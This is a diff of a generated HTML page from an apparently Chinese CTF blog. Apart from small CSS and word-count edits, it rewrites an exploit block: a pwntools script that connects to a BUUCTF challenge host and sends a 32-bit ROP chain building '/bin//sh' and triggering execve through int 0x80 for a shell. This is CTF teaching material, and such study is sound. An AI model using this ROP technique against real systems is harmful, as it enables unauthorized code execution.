@@ -53,7 +53,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1"></head>
+<meta name="generator" content="Hexo 5.4.1">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
 
 
 <body>
@@ -393,7 +395,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    830
+                    716
                 </div>
                 
 
@@ -446,46 +448,46 @@
 <h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-none"><code class="language-none">from pwn import *
 from struct import pack
  
-q &#x3D; remote(&#39;node4.buuoj.cn&#39;,25783)
-context.log_level &#x3D; &#39;debug&#39;
+q = remote('node4.buuoj.cn',25783)
+context.log_level = 'debug'
  
 def payload():
-    p &#x3D; &#39;a&#39;*0xc + &#39;bbbb&#39;
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret
-    p +&#x3D; &#39;&#x2F;bin&#39;
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret
-    p +&#x3D; &#39;&#x2F;&#x2F;sh&#39;
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080de769) # pop ecx ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret
-    p +&#x3D; pack(&#39;&lt;I&#39;, 0x0806c943) # int 0x80
+    p = 'a'*0xc + 'bbbb'
+    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret
+    p += pack('&lt;I', 0x080ea060) # @ .data
+    p += pack('&lt;I', 0x080b8016) # pop eax ; ret
+    p += '/bin'
+    p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret
+    p += pack('&lt;I', 0x080ea064) # @ .data + 4
+    p += pack('&lt;I', 0x080b8016) # pop eax ; ret
+    p += '//sh'
+    p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret
+    p += pack('&lt;I', 0x080ea068) # @ .data + 8
+    p += pack('&lt;I', 0x080492d3) # xor eax, eax ; ret
+    p += pack('&lt;I', 0x0805466b) # mov dword ptr [edx], eax ; ret
+    p += pack('&lt;I', 0x080481c9) # pop ebx ; ret
+    p += pack('&lt;I', 0x080ea060) # @ .data
+    p += pack('&lt;I', 0x080de769) # pop ecx ; ret
+    p += pack('&lt;I', 0x080ea068) # @ .data + 8
+    p += pack('&lt;I', 0x0806ecda) # pop edx ; ret
+    p += pack('&lt;I', 0x080ea068) # @ .data + 8
+    p += pack('&lt;I', 0x080492d3) # xor eax, eax ; ret
+    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
+    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
+    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
+    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
+    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
+    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
+    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
+    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
+    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
+    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
+    p += pack('&lt;I', 0x0807a66f) # inc eax ; ret
+    p += pack('&lt;I', 0x0806c943) # int 0x80
     return p
-shell &#x3D; payload()
+shell = payload()
 q.sendline(shell)
 q.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
@@ -911,7 +913,7 @@ q.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">42.3k</span>
+                        class="white-color">41.6k</span>
             
             
             
